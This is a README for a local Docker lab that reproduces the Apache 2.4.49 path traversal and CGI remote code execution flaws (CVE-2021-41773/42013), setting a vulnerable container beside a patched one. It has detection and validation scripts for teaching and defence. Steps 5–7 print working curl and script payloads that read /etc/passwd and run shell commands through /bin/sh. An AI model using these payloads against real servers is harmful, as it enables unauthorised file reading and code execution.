# Running the CVE-2021-41773 / CVE-2021-42013 Lab

---

## Prerequisites (one-time check)

Open PowerShell and verify these are installed:

```powershell
docker --version        # need 20.10+
docker compose version  # need v2.0+
python --version        # need 3.7+
```

> **No pip installs needed** — all Python scripts use the standard library only.

---

## Step 1 — Navigate to the project folder

```powershell
cd "C:\Users\Ananya Dwivedi\Desktop\INE_Assignment"
```

---

## Step 2 — Build the Docker images

```powershell
docker compose build
```

- Downloads `httpd:2.4.49` (vulnerable) and `httpd:2.4.51` (patched) from Docker Hub
- Takes ~2 minutes on first run; cached on subsequent runs

---

## Step 3 — Start both containers

```powershell
docker compose up -d
```

Verify they are running:

```powershell
docker compose ps
```

Expected output:

```
NAME                 IMAGE                              PORTS
cve_lab_vulnerable   cve-lab/apache-2.4.49:vulnerable   127.0.0.1:8080->80/tcp
cve_lab_patched      cve-lab/apache-2.4.51:patched      127.0.0.1:8081->80/tcp
```

| Container | URL | Version |
|:----------|:----|:--------|
| Vulnerable | http://127.0.0.1:8080 | Apache 2.4.49 - mod_cgi ON, permissive config |
| Patched    | http://127.0.0.1:8081 | Apache 2.4.51 - hardened config |

> All traffic stays on 127.0.0.1 — nothing is exposed to your LAN or internet.

---

## Step 4 — Run the Detection Scanner

**Against the vulnerable container:**

```powershell
python scripts/detect_cve.py --url http://127.0.0.1:8080
```

Expected result:
```
[!!] FINAL VERDICT: VULNERABLE
Confidence: HIGH
```

**Against the patched container:**

```powershell
python scripts/detect_cve.py --url http://127.0.0.1:8081
```

Expected result:
```
[OK] FINAL VERDICT: PATCHED / SECURE
Confidence: HIGH
```

Save results to a JSON report:

```powershell
python scripts/detect_cve.py --url http://127.0.0.1:8080 --output evidence/my_scan.json
```

---

## Step 5 — Run the Path Traversal Validator

```powershell
# Against vulnerable -- should show HTTP 200 + file content
python scripts/validate_traversal.py --url http://127.0.0.1:8080 --file /etc/passwd

# Read the canary flag
python scripts/validate_traversal.py --url http://127.0.0.1:8080 --file /var/secret/confidential_token.txt

# Against patched -- should show HTTP 400
python scripts/validate_traversal.py --url http://127.0.0.1:8081 --file /etc/passwd
```

Options:

| Flag | Default | Description |
|:-----|:--------|:------------|
| --url | http://127.0.0.1:8080 | Target server |
| --file | /etc/passwd | Remote file to attempt reading |
| --mode | both | 41773, 42013, or both |
| --verbose | off | Show full response headers |

---

## Step 6 — Run the CGI / RCE Validator

```powershell
# Against vulnerable -- should show command output (uid=1(daemon))
python scripts/validate_cgi_handling.py --url http://127.0.0.1:8080 --cmd "id; uname -a; whoami"

# Read the canary flag via RCE
python scripts/validate_cgi_handling.py --url http://127.0.0.1:8080 --cmd "cat /var/secret/confidential_token.txt"

# Against patched -- should show HTTP 400
python scripts/validate_cgi_handling.py --url http://127.0.0.1:8081 --cmd "id"
```

Options:

| Flag | Default | Description |
|:-----|:--------|:------------|
| --url | http://127.0.0.1:8080 | Target server |
| --cmd | id | Shell command to run |
| --mode | both | 41773, 42013, or both |
| --verbose | off | Show full response headers |

---

## Step 7 — Quick curl Proof (optional)

```powershell
# Path traversal -- read /etc/passwd (should return file content)
curl.exe --path-as-is "http://127.0.0.1:8080/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd"

# CVE-2021-42013 double-encoded bypass
curl.exe --path-as-is "http://127.0.0.1:8080/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd"

# CGI RCE -- run id command (should return uid=1(daemon))
curl.exe --path-as-is -X POST "http://127.0.0.1:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" --data-binary "echo; id"

# Read the canary flag via CGI
curl.exe --path-as-is -X POST "http://127.0.0.1:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" --data-binary "echo; cat /var/secret/confidential_token.txt"

# Same requests against patched -- should all return HTTP 400
curl.exe -v --path-as-is "http://127.0.0.1:8081/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd"
```

---

## Step 8 — Generate All Evidence at Once

```powershell
# Windows automation script -- builds, starts, and captures all evidence files
scripts\setup.bat run-all

# Or if containers are already running, just regenerate evidence
scripts\setup.bat evidence
```

Evidence files are saved to the evidence/ folder.

---

## Step 9 — Stop the Lab

```powershell
docker compose down
```

---

## What Each Script Does

| Script | Purpose |
|:-------|:--------|
| scripts/detect_cve.py | Defensive scanner -- passive banner check + active non-destructive probe. Outputs PASS/FAIL verdict with confidence level. |
| scripts/validate_traversal.py | Regression tester -- sends documented path-traversal payloads, checks HTTP response. |
| scripts/validate_cgi_handling.py | RCE tester -- sends POST via traversal path to /bin/sh, checks if command output is returned. |
| scripts/setup.bat | Windows automation -- build, start, evidence capture. |
| scripts/setup.sh | Linux/macOS automation -- same as above. |

---

## Expected Results at a Glance

| Test | Vulnerable (8080) | Patched (8081) |
|:-----|:-----------------|:---------------|
| validate_traversal.py | HTTP 200 + file content | HTTP 400 |
| validate_cgi_handling.py | HTTP 200 + command output | HTTP 400 |
| detect_cve.py | [!!] VULNERABLE | [OK] PATCHED / SECURE |

---

## Troubleshooting

**Port already in use:**
```powershell
netstat -ano | findstr ":8080"
# Change host port in docker-compose.yml if needed
```

**Container won't start:**
```powershell
docker compose logs apache-vulnerable
docker compose logs apache-patched
```

**curl encodes % signs incorrectly on Windows:**
Use the --path-as-is flag (already included above), or use the Python scripts instead -- they use http.client directly and do not re-encode the path.

**detect_cve.py exits with error code 2:**
```powershell
# Containers not running -- start them first
docker compose up -d
```
